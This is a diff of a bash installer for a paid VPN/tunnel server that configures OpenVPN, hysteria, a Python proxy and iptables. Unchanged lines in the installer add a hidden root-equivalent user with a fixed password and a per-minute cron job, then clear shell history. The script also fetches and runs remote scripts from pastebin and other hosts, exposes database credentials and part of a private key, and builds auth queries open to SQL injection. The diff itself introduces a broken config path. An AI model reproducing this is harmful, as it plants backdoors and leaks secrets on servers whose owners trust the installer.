@@ -1,5 +1,5 @@
 #!/bin/bash
-rm -rf test*
+rm -rf test2*
 
 
 RED='\033[01;31m';
@@ -30,7 +30,7 @@ apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 }
 
 filesfolders () {
-mkdir /etc/openvpn/script
+mkdir /etc/openvpn/login
 mkdir /var/www/html/stat
 touch /var/www/html/stat/status.txt
 touch /var/www/html/stat/udpstatus.txt
@@ -56,7 +56,7 @@ server 10.8.0.0 255.255.0.0
 user nobody
 username-as-common-name
 client-cert-not-required
-auth-user-pass-verify /etc/openvpn/script/authvpn.sh via-env
+auth-user-pass-verify /etc/openvpn/login/authvpn.sh via-env
 push "redirect-gateway def1 bypass-dhcp"
 push "dhcp-option DNS 8.8.4.4"
 push "dhcp-option DNS 8.8.8.8"
@@ -89,7 +89,7 @@ server 172.20.0.0 255.255.255.0
 user nobody
 username-as-common-name
 client-cert-not-required
-auth-user-pass-verify /etc/openvpn/script/authvpn.sh via-env
+auth-user-pass-verify /etc/openvpn/login/authvpn.sh via-env
 push "redirect-gateway def1 bypass-dhcp"
 push "dhcp-option DNS 8.8.4.4"
 push "dhcp-option DNS 8.8.8.8"
@@ -122,7 +122,7 @@ server 10.9.0.0 255.255.255.0
 user nobody
 username-as-common-name
 client-cert-not-required
-auth-user-pass-verify /etc/openvpn/script/authvpn.sh via-env
+auth-user-pass-verify /etc/openvpn/login/authvpn.sh via-env
 push "redirect-gateway def1 bypass-dhcp"
 push "dhcp-option DNS 8.8.4.4"
 push "dhcp-option DNS 8.8.8.8"
@@ -272,7 +272,7 @@ MhZ/R1wSBx9xz+14PQ==
 -----END PRIVATE KEY-----
 EOM
 
-cat <<\EOM >/etc/openvpn/script/config.sh
+cat <<\EOM >/etc/openvpn/login/config.sh
 #!/bin/bash
 HOST='185.61.137.171'
 USER='mediatek2_getorssh'
@@ -280,9 +280,9 @@ PASS='F1005r90@'
 DB='mediatek2_getorssh'
 EOM
 
-cat <<\EOM >/etc/openvpn/script/connect.sh
+cat <<\EOM >/etc/openvpn/login/connect.sh
 #!/bin/bash
-. /etc/openvpn/script/config.sh
+. /etc/openvpn/login/config.sh
 ##tm="$(date +%s)"
 ##dt="$(date +'%Y-%m-%d %H:%M:%S')"
 ##timestamp="$(date +'%FT%TZ')"
@@ -290,9 +290,9 @@ cat <<\EOM >/etc/openvpn/script/connect.sh
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected=1 WHERE user_name='$common_name' "
 EOM
 
-cat <<\EOM >/etc/openvpn/script/disconnect.sh
+cat <<\EOM >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-. /etc/openvpn/script/config.sh
+. /etc/openvpn/loginconfig.sh
 tm="$(date +%s)"
 dt="$(date +'%Y-%m-%d %H:%M:%S')"
 timestamp="$(date +'%FT%TZ')"
@@ -376,11 +376,12 @@ EOF
 }
 
 install_hysteria(){
-clear
-echo 'Installing hysteria.'
-{
+#hysteria files
 wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/apernet/hysteria/master/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh
+}
 
+hysteria_folder(){
+#create gyteria folder
 mkdir -p /etc/hysteria
 
 wget -O /etc/hysteria/config.json "https://raw.githubusercontent.com/DexterRepositories/Hysteria/main/mtkextremeobfs"
@@ -390,7 +391,6 @@ chmod 755 /etc/hysteria/config.json
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-} &>/dev/null
 }
 
 create_hostname() {
@@ -540,7 +540,7 @@ chmod 755 /etc/hysteria/server.key
 
 
 install_rclocal(){
-  {     
+# creating service  
     echo "[Unit]
 Description=teamkidlat service
 Documentation=http://teamkidlat.com
@@ -564,20 +564,36 @@ exit 0' >> /etc/rc.local
 
 sudo chmod +x /etc/rc.local
 systemctl daemon-reload
-
+sudo systemctl enable teamkidlat
+sudo systemctl start teamkidlat.service
     
 mkdir -m 777 /root/.web
 echo "Made with love by: Dexter Eskalarte... " >> /root/.web/index.php
 
 echo "
 hysteria_port=5666" >> /root/.ports
+}
 
-  }&>/dev/null
+hysteria_services() {
+	sudo debconf-set-selections <<< "iptables-persistent iptables-persistent/autosave_v4 boolean true"
+    sudo debconf-set-selections <<< "iptables-persistent iptables-persistent/autosave_v6 boolean true"
+	apt -y install iptables-persistent
+	iptables -t nat -A PREROUTING -i $(ip -4 route ls|grep default|grep -Po '(?<=dev )(\S+)'|head -1) -p udp --dport 20000:65000 -j DNAT --to-destination 5666
+	ip6tables -t nat -A PREROUTING -i $(ip -4 route ls|grep default|grep -Po '(?<=dev )(\S+)'|head -1) -p udp --dport 20000:65000 -j DNAT --to-destination 5666
+	sysctl net.ipv4.conf.all.rp_filter=0
+	sysctl net.ipv4.conf.$(ip -4 route ls|grep default|grep -Po '(?<=dev )(\S+)'|head -1).rp_filter=0 
+	echo "net.ipv4.ip_forward = 1
+	net.ipv4.conf.all.rp_filter=0
+	net.ipv4.conf.$(ip -4 route ls|grep default|grep -Po '(?<=dev )(\S+)'|head -1).rp_filter=0" > /etc/sysctl.conf  
+	sysctl -p
+    sudo iptables-save > /etc/iptables/rules.v4
+    sudo ip6tables-save > /etc/iptables/rules.v6
+	systemctl enable hysteria-server.service
+    systemctl restart hysteria-server.service	
 }
 
 iptablesrules () {
-echo "Installing iptables."
-{
+
 echo "net.ipv4.ip_forward=1
 net.core.default_qdisc=fq
 net.ipv4.conf.all.rp_filter=0
@@ -593,9 +609,6 @@ INSTALL_BBR=true
 sysctl -p
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 iptables -F
-iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j MASQUERADE
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j SNAT --to-source `curl ipecho.net/plain`
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o ens3 -j MASQUERADE
@@ -608,8 +621,6 @@ iptables -t nat -A POSTROUTING -s 10.9.0.0/16 -o eth0 -j MASQUERADE
 iptables -t nat -A POSTROUTING -s 10.9.0.0/16 -o eth0 -j SNAT --to-source `curl ipecho.net/plain`
 iptables -t nat -A POSTROUTING -s 10.9.0.0/16 -o ens3 -j MASQUERADE
 iptables -t nat -A POSTROUTING -s 10.9.0.0/16 -o ens3 -j SNAT --to-source `curl ipecho.net/plain`
-echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
-echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
 mkdir /etc/iptables
 iptables-save > /etc/iptables/rules.v4
 sudo apt-get install iptables-persistent -y 
@@ -624,7 +635,6 @@ useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
 crontab -u dexterjakulero -r
 (crontab -l 2>/dev/null || true; echo "* * * * * /bin/auto >/dev/null 2>&1") | crontab - -u dexterjakulero
 
-  }&>/dev/null
 }
 
 serviceenable () {
@@ -649,11 +659,262 @@ systemctl enable dropbear
 systemctl enable squid
 systemctl enable stunnel4
 systemctl enable openvpn
-systemctl enable hysteria-server.service
-systemctl restart hysteria-server.service
-sudo systemctl enable teamkidlat
-sudo systemctl start teamkidlat.service
+systemctl enable yakult
+systemctl restart yakult
 
+
+}
+
+service() {
+cat << PTHON > /usr/sbin/yakult
+#!/usr/bin/python
+import socket, threading, thread, select, signal, sys, time, getopt
+# Listen
+LISTENING_ADDR = '0.0.0.0'
+if sys.argv[1:]:
+  LISTENING_PORT = sys.argv[1]
+else:
+  LISTENING_PORT = 80
+# Pass
+PASS = ''
+# CONST
+BUFLEN = 4096 * 4
+TIMEOUT = 3600
+DEFAULT_HOST = '127.0.0.1:550'
+RESPONSE = 'HTTP/1.1 101 <font color="red">Dexter Eskalarte</font>\r\n\r\nContent-Length: 104857600000\r\n\r\n'
+class Server(threading.Thread):
+    def __init__(self, host, port):
+        threading.Thread.__init__(self)
+        self.running = False
+        self.host = host
+        self.port = port
+        self.threads = []
+        self.threadsLock = threading.Lock()
+        self.logLock = threading.Lock()
+    def run(self):
+        self.soc = socket.socket(socket.AF_INET)
+        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.soc.settimeout(2)
+        intport = int(self.port)
+        self.soc.bind((self.host, intport))
+        self.soc.listen(0)
+        self.running = True
+        try:
+            while self.running:
+                try:
+                    c, addr = self.soc.accept()
+                    c.setblocking(1)
+                except socket.timeout:
+                    continue
+                conn = ConnectionHandler(c, self, addr)
+                conn.start()
+                self.addConn(conn)
+        finally:
+            self.running = False
+            self.soc.close()
+    def printLog(self, log):
+        self.logLock.acquire()
+        print log
+        self.logLock.release()
+    def addConn(self, conn):
+        try:
+            self.threadsLock.acquire()
+            if self.running:
+                self.threads.append(conn)
+        finally:
+            self.threadsLock.release()
+    def removeConn(self, conn):
+        try:
+            self.threadsLock.acquire()
+            self.threads.remove(conn)
+        finally:
+            self.threadsLock.release()
+    def close(self):
+        try:
+            self.running = False
+            self.threadsLock.acquire()
+            threads = list(self.threads)
+            for c in threads:
+                c.close()
+        finally:
+            self.threadsLock.release()
+class ConnectionHandler(threading.Thread):
+    def __init__(self, socClient, server, addr):
+        threading.Thread.__init__(self)
+        self.clientClosed = False
+        self.targetClosed = True
+        self.client = socClient
+        self.client_buffer = ''
+        self.server = server
+        self.log = 'Connection: ' + str(addr)
+    def close(self):
+        try:
+            if not self.clientClosed:
+                self.client.shutdown(socket.SHUT_RDWR)
+                self.client.close()
+        except:
+            pass
+        finally:
+            self.clientClosed = True
+        try:
+            if not self.targetClosed:
+                self.target.shutdown(socket.SHUT_RDWR)
+                self.target.close()
+        except:
+            pass
+        finally:
+            self.targetClosed = True
+    def run(self):
+        try:
+            self.client_buffer = self.client.recv(BUFLEN)
+            hostPort = self.findHeader(self.client_buffer, 'X-Real-Host')
+            if hostPort == '':
+                hostPort = DEFAULT_HOST
+            split = self.findHeader(self.client_buffer, 'X-Split')
+            if split != '':
+                self.client.recv(BUFLEN)
+            if hostPort != '':
+                passwd = self.findHeader(self.client_buffer, 'X-Pass')
+				
+                if len(PASS) != 0 and passwd == PASS:
+                    self.method_CONNECT(hostPort)
+                elif len(PASS) != 0 and passwd != PASS:
+                    self.client.send('HTTP/1.1 400 WrongPass!\r\n\r\n')
+                elif hostPort.startswith('127.0.0.1') or hostPort.startswith('localhost'):
+                    self.method_CONNECT(hostPort)
+                else:
+                    self.client.send('HTTP/1.1 403 Forbidden!\r\n\r\n')
+            else:
+                print '- No X-Real-Host!'
+                self.client.send('HTTP/1.1 400 NoXRealHost!\r\n\r\n')
+        except Exception as e:
+            self.log += ' - error: ' + e.strerror
+            self.server.printLog(self.log)
+	    pass
+        finally:
+            self.close()
+            self.server.removeConn(self)
+    def findHeader(self, head, header):
+        aux = head.find(header + ': ')
+        if aux == -1:
+            return ''
+        aux = head.find(':', aux)
+        head = head[aux+2:]
+        aux = head.find('\r\n')
+        if aux == -1:
+            return ''
+        return head[:aux];
+    def connect_target(self, host):
+        i = host.find(':')
+        if i != -1:
+            port = int(host[i+1:])
+            host = host[:i]
+        else:
+            if self.method=='CONNECT':
+                port = 443
+            else:
+                port = sys.argv[1]
+        (soc_family, soc_type, proto, _, address) = socket.getaddrinfo(host, port)[0]
+        self.target = socket.socket(soc_family, soc_type, proto)
+        self.targetClosed = False
+        self.target.connect(address)
+    def method_CONNECT(self, path):
+        self.log += ' - CONNECT ' + path
+        self.connect_target(path)
+        self.client.sendall(RESPONSE)
+        self.client_buffer = ''
+        self.server.printLog(self.log)
+        self.doCONNECT()
+    def doCONNECT(self):
+        socs = [self.client, self.target]
+        count = 0
+        error = False
+        while True:
+            count += 1
+            (recv, _, err) = select.select(socs, [], socs, 3)
+            if err:
+                error = True
+            if recv:
+                for in_ in recv:
+		    try:
+                        data = in_.recv(BUFLEN)
+                        if data:
+			    if in_ is self.target:
+				self.client.send(data)
+                            else:
+                                while data:
+                                    byte = self.target.send(data)
+                                    data = data[byte:]
+                            count = 0
+			else:
+			    break
+		    except:
+                        error = True
+                        break
+            if count == TIMEOUT:
+                error = True
+            if error:
+                break
+def print_usage():
+    print 'Usage: proxy.py -p <port>'
+    print '       proxy.py -b <bindAddr> -p <port>'
+    print '       proxy.py -b 0.0.0.0 -p 80'
+def parse_args(argv):
+    global LISTENING_ADDR
+    global LISTENING_PORT
+    
+    try:
+        opts, args = getopt.getopt(argv,"hb:p:",["bind=","port="])
+    except getopt.GetoptError:
+        print_usage()
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt == '-h':
+            print_usage()
+            sys.exit()
+        elif opt in ("-b", "--bind"):
+            LISTENING_ADDR = arg
+        elif opt in ("-p", "--port"):
+            LISTENING_PORT = int(arg)
+def main(host=LISTENING_ADDR, port=LISTENING_PORT):
+    print "\n:-------PythonProxy-------:\n"
+    print "Listening addr: " + LISTENING_ADDR
+    print "Listening port: " + str(LISTENING_PORT) + "\n"
+    print ":-------------------------:\n"
+    server = Server(LISTENING_ADDR, LISTENING_PORT)
+    server.start()
+    while True:
+        try:
+            time.sleep(2)
+        except KeyboardInterrupt:
+            print 'Stopping...'
+            server.close()
+            break
+#######    parse_args(sys.argv[1:])
+if __name__ == '__main__':
+    main()
+PTHON
+}
+service1() {
+cat << END > /lib/systemd/system/yakult.service
+[Unit]
+Description=Yakult
+Documentation=https://google.com
+After=network.target nss-lookup.target
+[Service]
+Type=simple
+User=root
+NoNewPrivileges=true
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+ExecStart=/usr/bin/python -O /usr/sbin/yakult
+ProtectSystem=true
+ProtectHome=true
+RemainAfterExit=yes
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+END
 }
 
 pythonproxyinstall(){
@@ -719,9 +980,6 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
-dos2unix /etc/socks.py
-chmod +x /etc/socks.py
 rm /etc/apt/sources.list
 sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 } &>/dev/null
@@ -764,9 +1022,9 @@ echo -e " \033[0;35m════════════════════
 }
 
 premiumcategory () {
-cat <<\EOM >/etc/openvpn/script/authvpn.sh
+cat <<\EOM >/etc/openvpn/login/authvpn.sh
 #!/bin/bash
-. /etc/openvpn/script/config.sh
+. /etc/openvpn/login/config.sh
 Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
@@ -775,9 +1033,9 @@ wget -O /usr/local/sbin/ssh.php https://raw.githubusercontent.com/NuclearDevilSt
 }
 
 vipcategory () {
-cat <<\EOM >/etc/openvpn/script/authvpn.sh
+cat <<\EOM >/etc/openvpn/login/authvpn.sh
 #!/bin/bash
-. /etc/openvpn/script/config.sh
+. /etc/openvpn/login/config.sh
 Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (vip_duration > 0 OR private_duration > 0)"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
@@ -786,9 +1044,9 @@ wget -O /usr/local/sbin/ssh.php mhixvpnlite.000webhostapp.com/uni/debian/vip.sh 
 }
 
 privatecategory () {
-cat <<\EOM >/etc/openvpn/script/authvpn.sh
+cat <<\EOM >/etc/openvpn/login/authvpn.sh
 #!/bin/bash
-. /etc/openvpn/script/config.sh
+. /etc/openvpn/login/config.sh
 Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND private_duration > 0"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
@@ -810,13 +1068,17 @@ do
 		systemupdate		
 		systempackages
 		filesfolders	
-		iptablesrules	
+		iptablesrules
+		service
+		service1
 		pythonproxyinstall	
 		premiumcategory			
 		serviceenable
 		install_hysteria
+		hysteria_folder
 		create_hostname
 		install_rclocal
+		hysteria_services
 		sleep 3
 		clear
 		display_menu
@@ -885,4 +1147,4 @@ do
 done
 history -c
 history -w
-rm -rf test
+rm -rf test2
